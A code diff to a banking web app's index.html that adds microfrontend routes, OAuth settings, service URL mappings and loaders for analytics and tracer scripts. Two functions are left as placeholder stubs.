+            "contratacion/depositos": {"uniqueId": "deposits_hiring","remoteEntry": "./f-ng-50080398-deposits_remote_entry.js","version": "1.0.0","aside": true,"element": "f-ng-50080398-deposits","framework": "angular","mountPath": "contratacion/depositos","associatedMicrofronts": ["common_gdu360_claim"]},
+            "seguro-hogar": {"uniqueId": "insurances_omnichannel_home","remoteEntry": "./san-dishog-mfhogar_remote_entry.js","version": "1.0.0","aside": true,"element": "san-dishog-mfhogar","framework": "angular","mountPath": "seguro-hogar","associatedMicrofronts": ["common_gdu360_claim"]},
+            "buzon-correspondencia": {"uniqueId": "scc_mailbox","remoteEntry": "./san-sccbat-mailboxui_remote_entry.js","version": "1.0.0","aside": true,"element": "san-sccbat-mailboxui","framework": "angular","mountPath": "buzon-correspondencia","associatedMicrofronts": ["common_gdu360_claim"]},
+            "seguros-proteccion-impago-alquiler": {"uniqueId": "insurances_rental_protection","remoteEntry": "./san-disalq-mfalquifront_remote_entry.js","version": "1.0.0","aside": true,"element": "san-disalq-mfalquifront","framework": "angular","mountPath": "seguros-proteccion-impago-alquiler","associatedMicrofronts": ["common_gdu360_claim"]},
+            "datos-fioc": {"uniqueId": "fioc_data","remoteEntry": "./mf-ng-50084203-front-fioc_remote_entry.js","version": "1.0.0","aside": true,"element": "fnfioc-front-fioc-example","framework": "angular","mountPath": "datos-fioc","associatedMicrofronts": ["common_gdu360_claim"]},
+            "astro": {"uniqueId": "insurances_astro","remoteEntry": "./san-fidcds-mfastro_remote_entry.js","version": "1.0.0","aside": true,"element": "san-fidcds-mfastro","framework": "angular","mountPath": "astro","associatedMicrofronts": []},
+            "asesoramiento-puntual-seguros": {"uniqueId": "insurance_advice","remoteEntry": "./mf-ng-50082740-front-advice_remote_entry.js","version": "1.0.0","aside": true,"element": "diases-front-advice","framework": "angular","mountPath": "asesoramiento-puntual-seguros","associatedMicrofronts": []},
+            "seguros-inversion": {"uniqueId": "insurance_saving_single_premium","remoteEntry": "./mf-ng-50085182-front-priuni_remote_entry.js","version": "1.0.0","aside": true,"element": "mf-ng-50085182-front-priuni","framework": "angular","mountPath": "seguros-inversion","associatedMicrofronts": ["common_gdu360_claim"]},
+            "seguros-ahorro": {"uniqueId": "insurance_income","remoteEntry": "./mf-ng-50082217-front-rentas_remote_entry.js","version": "1.0.0","aside": true,"element": "mf-ng-50082217-front-rentas","framework": "angular","mountPath": "seguros-ahorro","associatedMicrofronts": ["common_gdu360_claim"]},
+            "esave": {"uniqueId": "newservices_esave","remoteEntry": "./san-nrspba-esavefront_remote_entry.js","version": "1.0.0","element": "san-nrspba-esavefront","framework": "angular","mountPath": "esave","associatedMicrofronts": []},
+            "tarjetas/detalle/anticipo-tpv": {"uniqueId": "pagos_tpv_advance","remoteEntry": "./san-paesfr-bizzpayadvance_remote_entry.js","version": "1.0.0","aside": true,"element": "san-paesfr-bizzpayadvance","framework": "angular","mountPath": "tarjetas/detalle/anticipo-tpv","associatedMicrofronts": ["common_gdu360_claim"]},
+            "funnel-retencion-digital": {"uniqueId": "insurances_digital_retention","remoteEntry": "./smd-direcl-mfretencion_remote_entry.js","version": "1.0.0","aside": true,"element": "smd-direcl-mfretencion","framework": "angular","mountPath": "funnel-retencion-digital","associatedMicrofronts": ["common_gdu360_claim"]},
+            "seguros-frontal-unico": {"uniqueId": "insurances_unique_front","remoteEntry": "./mf-ng-00000000-mfdibacoportal_remote_entry.js","version": "1.0.0","aside": true,"element": "dibaco-mfdibacoportal","framework": "angular","mountPath": "seguros-frontal-unico","associatedMicrofronts": ["common_gdu360_claim"]}
+          },
+          "oauth": {
+            "type": "oauth",
+            "scope": ["openid"],
+            "storageStrategy": "sessionStorage",
+            "client": {"clientId": "2f1e2ef6-9106-441e-a397-2d7f16fd4e98"},
+            "redirectUri": "${baseHref}/oneweb/global-position/",
+            "logoutRedirectUri": "https://www.bancosantander.es/particulares",
+            "sessionExpiredRedirectUri": "https://www.bancosantander.es/particulares",
+            "issuerUri": "${baseHref}/oneweb/api/ow/sos/oauth",
+            "serverConfig": {
+              "issuer": "${baseHref}/oneweb/api/ow/sos/oauth",
+              "authorization_endpoint": "${baseHref}/oneweb/api/ow/sos/oauth/authorize",
+              "token_endpoint": "${baseHref}/oneweb/api/ow/sos/oauth/token",
+              "end_session_endpoint": "${baseHref}/oneweb/api/ow/sos/oauth/logoff",
+              "claims_parameter_supported": false,
+              "claims_supported": ["sub","email","sid","auth_time","iss"],
+              "code_challenge_methods_supported": ["S256"],
+              "grant_types_supported": ["implicit","authorization_code","refresh_token","client_credentials","password"],
+              "authorization_response_iss_parameter_supported": false,
+              "response_modes_supported": ["form_post","fragment","query"],
+              "response_types_supported": ["code id_token","code","id_token","none"],
+              "scopes_supported": ["openid","offline_access","read"],
+              "subject_types_supported": ["public"],
+              "token_endpoint_auth_methods_supported": ["client_secret_basic","client_secret_jwt","client_secret_post","private_key_jwt","none"],
+              "token_endpoint_auth_signing_alg_values_supported": ["HS256","RS256","PS256","ES256","EdDSA"],
+              "id_token_signing_alg_values_supported": ["RS256"],
+              "request_parameter_supported": false,
+              "request_uri_parameter_supported": false,
+              "claim_types_supported": ["normal"]
+            }
+          },
+          "docRoutes": {
+            "dw": "https://github.alm.europe.cloudcenter.corp/pages/sanes-darwin-front/ng-darwin/",
+            "jsonServer": "https://github.com/typicode/json-server",
+            "ng": "https://angular.io",
+            "ngCli": "https://angular.io/cli"
+          },
+          "generalConfig": {
+            "loginUrl": "${baseHref}/login/",
+            "santanderLogo": "./assets/FA_SANTANDER_PV_POS_RGB.png",
+            "santanderLogoRedirection": "/oneweb",
+            "logoutRequestMethod": "post",
+            "santanderErrorAccountRedirection": "https://www.bancosantander.es/particulares",
+            "languages": ["es-ES","en-GB","ca-ES","gl-ES"]
+          },
+          "opinator": {
+            "alwaysShow": false,
+            "designator_bote": "Listas_NPS",
+            "designator": "WEB-RET-logout-NPS-ES",
+            "footerUrl": "https://www.opinator.com/opi/WEB-RET-Shellfooter-GeneralView-ES",
+            "customUrl": "https://www.opinator.com/opi/WEB-RET-global-position-NPS-ES",
+            "logoutUrl": "https://www.opinator.com/opi/WEB-RET-logout-NPS-ES",
+            "opinatorLogout": "WEB-RET-logout-NPS-ES",
+            "footerUrlParams": {"id": "client_id","language": "carry_language"},
+            "logoutUrlParams": {"id": "client_id","embed": false}
+          },
+          "utag": {"enabled": true,"profile": "retail","profileUrl": "es-web-obretail","account": "sanes","env": "prod"},
+          "scripts": ["https://www.opinator.com/resources/js/embed.main.min.js"],
+          "mustOkResponseUrls": ["/oneweb/api/v1/customer_profile","/oneweb/api/v1/shell/menus","/oneweb/api/v1/shell/retrieve_party_content"],
+          "needHelpbutton": {"display": false,"navigationKey": "legacy_cards"},
+          "preloadRequests": {"shortcutsResponse": {"url": "/oneweb/api/v1/shell/retrieve_party_content?location=gpMainShortcuts,gpSideBarShortcuts,gp3DotsMenu","method": "GET"}},
+          "operability": {"enabled": false,"operabilityUrl": "","redirectUrl": ""},
+          "openedMenuCategories": [2,3],
+          "app": {"sessionTabManager": "enabled"},
+          "mailboxAsideNotifications": {"categoryToShow": ["1","2","3"]},
+          "closeWebview": "https://www.bancosantander.es",
+          "entryByPost": {
+            "base": "https://${dns_base}/api/v1",
+            "baseV2": "https://${dns_base}/api/v2",
+            "broker": "https://${dns_broker}/",
+            "brokerFondos": "https://${dns_base}/broker/fondos/",
+            "brokerGrupo": "https://${dns_brokerGrupo}/",
+            "brokerPlanes": "https://${dns_inversiones}/plans/entry/",
+            "carbonfp": "https://${dns_carbonfootprint}/",
+            "clientes": "https://${dns_clientes}/",
+            "cmcReg": "https://cmcreg.bancosantander.es/",
+            "docubox": "https://${dns_base}/paas/docubox/",
+            "inversiones": "https://${dns_inversiones}/",
+            "invoicing": "https://${dns_invoicing}/",
+            "inversionesGW": "https://${dns_base}/inversiones/",
+            "microsite": "https://${dns_microsite}/",
+            "micrositeapp": "https://${dns_micrositeapp}/",
+            "micrositeTarjetas": "https://${dns_microsite}/filesFF/RWD/tarjetas/",
+            "online": "https://${dns_online}/",
+            "pagos": "https://${dns_pagos}/",
+            "particularesBase": "https://${dns_base_bks}/",
+            "portalNhb": "https://${dns_portalnhb}/",
+            "portalNWE": "https://${dns_portalnwe}/",
+            "schema": "https://${dns_schema_cloudfare}",
+            "servicingAhorro": "https://${dns_servicing}/",
+            "tealium": "${googleAnalytics}",
+            "tpv": "https://${dns_nwe}/paas/micomercio/",
+            "wwwBanco": "https://${dns_wwwbanco}/",
+            "experiences": "https://${dns_experiences}/",
+            "youtube": "https://${dns_youtube}/",
+            "youtupuntobe": "https://${dns_youtupuntobe}/",
+            "nuevoservicingahorro": "https://${dns_nuevoservicingahorro}/",
+            "digital": "https://${dns_digital}/",
+            "opinator": "https://${dns_opinator}/",
+            "opinatornet": "https://${dns_opinatornet}/",
+            "santanderpay": "https://${dns_santanderpay}/",
+            "comunicados": "https://${dns_comunicados}/",
+            "infoproductos": "https://${dns_infoproductos}/",
+            "impulsadigital": "https://${dns_impulsadigital}/",
+            "misapps": "https://${dns_misapps}/",
+            "recobros": "https://${dns_recobros}/",
+            "cmc": "https://${dns_cmc}/",
+            "apiauth": "https://${dns_apiauth}/",
+            "cajafuertedig": "https://${dns_cajafuertedig}/",
+            "wcm": "https://${dns_wcm}/",
+            "inbenta": "https://${dns_inbenta}/",
+            "migestor": "https://${dns_migestor}/",
+            "sanappinbenta": "https://${dns_sanappinbenta}/",
+            "citaprevia": "https://${dns_citaprevia}/",
+            "sanbot": "https://${dns_sanbot}/",
+            "twitter": "https://${dns_twitter}/",
+            "formsnccmov": "https://${dns_formsnccmov}/",
+            "ocu": "https://${dns_ocu}",
+            "wizink": "https://${dns_wizink}/",
+            "prestamodigital": "https://${dns_prestamodigital}/",
+            "simuladores": "https://${dns_simuladores}/",
+            "googleplay": "https://${dns_googleplay}/",
+            "appstore": "https://${dns_appstore}/",
+            "avatar": "https://${dns_avatar}/",
+            "inbenta04": "https://${dns_inbenta04}/",
+            "itunes": "https://${dns_itunes}/",
+            "formsnccpar": "https://${dns_formsnccpar}/",
+            "appsapple": "https://${dns_appsapple}/",
+            "hipotecadig": "https://${dns_hipotecadig}/",
+            "insights": "https://${dns_insights}/",
+            "micomercio": "https://${dns_micomercio}/",
+            "formsnccparbancsan": "https://${dns_formsnccparbancsan}/",
+            "bsanmobi": "https://${dns_bsanmobi}/",
+            "forms": "https://${dns_forms}/",
+            "favoritosatm": "https://${dns_atmfv}/",
+            "diserv": "https://${dns_diserv}/",
+            "valoravivienda": "https://${dns_valoravivienda}/",
+            "hucha": "https://${dns_hucha}/",
+            "digitaldisputes": "https://${dns_digitaldisputes}/",
+            "homeplanner": "https://${dns_homeplanner}/",
+            "sanflixmov": "https://${dns_sanflixmov}/",
+            "adnoperativoapp": "https://particulares.bancosantander.es/login/",
+            "particulares": "https://${dns_base}/",
+            "calcplanetaseguros": "https://${dns_calcplanetaseguros}/",
+            "santanbol": "https://${dns_santanbol}/",
+            "trackingIncidencias": "https://${dns_tracking_incidencias}/",
+            "comdigskey": "/paas/comdig/sk/comdig-sk-signature.js",
+            "avatarbcg": "https://${dns_base}/avatar-bcg-service/",
+            "smusic": "https://${dns_smusic}/",
+            "avatartania": "https://${dns_tania_avatar}",
+            "insurancesAccountBase": "https://${dns_accounts_insurances}/api/v1/",
+            "solicitudCancelarCuenta": "https://${dns_base}/paas/shell/entry",
+            "shellMob": "https://${dns_base}/paas/shell/entry",
+            "homevaluation": "https://${dns_homevaluation}/",
+            "plataformaInversion": "https://${dns_plataformainversion}/",
+            "clausulasBuzon": "https://${dns_comdig}/paas/comdig/api/v1/",
+            "oneweb": "https://${dns_base}/oneweb/api/ow/sos/oauth/"
           }
-          /* ... TOT EL TEU CONFIG ... */
         };
         window.config = config;
-      } catch(error) {
+      } catch(error){
         config = {};
         window.config = config;
         console.error('Error loading config.json', error);
       }
 
-      /* ... TOT EL TEU CODI JS EXISTENT (navigationConfigMap, customFunction, legacyAuthentication) ... */
+      // navigationConfigMap
+      try {
+        navigationConfigMap = {"legacy-psg": {"to": "/nhb/posicion-global"},"global-position": {"to": "global-position"}};
+        window.navigationConfigMap = navigationConfigMap;
+      } catch(error){
+        navigationConfigMap = {};
+        window.navigationConfigMap = navigationConfigMap;
+        console.error('Error loading navigationConfigMap', error);
+      }
 
-    } catch (error) {
+      // customFunction, legacyAuthentication, etc.
+      try {
+        customFunction = function() { /* ... codi original ... */ };
+      } catch(error){
+        customFunction = () => {};
+      }
+
+      try {
+        legacyAuthentication = function() { /* ... codi original ... */ };
+      } catch(error){
+        legacyAuthentication = () => {};
+      }
+
+      if(legacyAuthentication && typeof legacyAuthentication == 'function') legacyAuthentication();
+      if (customFunction && typeof customFunction === 'function') customFunction();
+
+      if (config.globalVars){
+        let configJSON = JSON.stringify(config);
+        for (const globalVarName in config.globalVars) {
+          configJSON = configJSON.replaceAll("${" + globalVarName + "}", config.globalVars[globalVarName]);
+        }
+        config = JSON.parse(configJSON);
+      }
+
+    } catch (error){
       console.error('General Configmap error');
     }
   </script>
 
-  <!-- Scripts Angular originals -->
+  <script type="text/javascript">
+    (function () {
+      let account = 'undef';
+      let profile = 'undef';
+      let profileUrl = 'undef';
+      let env = 'undef';
+      let enabled = false;
+      try {
+        account = config['utag']['account'];
+        profile = config['utag']['profile'];
+        profileUrl = config['utag']['profileUrl'];
+        env = config['utag']['env'];
+        enabled = config['utag']['enabled'];
+      } catch (error) { console.error('Cannot get config!'); }
+      if (window.location.href.startsWith('http://localhost:')) {
+        account = 'sanes'; profile = 'retail'; profileUrl = 'es-web-obretail'; env = 'qa'; enabled = true;
+      }
+      if (enabled) {
+        const scriptUrl = `https://tags.tiqcdn.com/utag/${account}/${profileUrl}/${env}/utag.js`;
+        const documentRef = document;
+        const scriptElement = documentRef.createElement('script');
+        scriptElement.src = scriptUrl;
+        scriptElement.type = 'text/javascript';
+        scriptElement.async = true;
+        const firstScript = documentRef.getElementsByTagName('script')[0];
+        firstScript.parentNode.insertBefore(scriptElement, firstScript);
+      } else { console.log('Utag script loading is disabled.'); }
+    })();
+  </script>
+
+  <script type="text/javascript">
+    (function () {
+      let owTracerSrc;
+      try {
+        owTracerSrc = config && config.urls && config.urls.owtracerLink;
+        if (!owTracerSrc) throw new Error('config.urls.owtracerLink no está definido');
+        console.log('URL SCRIPT OW-tracer:', owTracerSrc);
+        const owTracerScript = document.createElement('script');
+        owTracerScript.type = 'text/javascript';
+        owTracerScript.src = owTracerSrc;
+        owTracerScript.async = true;
+        document.body.appendChild(owTracerScript);
+      } catch (error) { console.error('No se pudo cargar el script OW-tracer:', error, config); }
+    })();
+  </script>
+
   <script src="polyfills.fa48a1dc03057afe.js" type="module"></script>
   <script src="main.2e44d5e6845b4a3d.js" type="module"></script>
   <link rel="stylesheet" href="styles.b5e4fd7d1a2435a3.css">
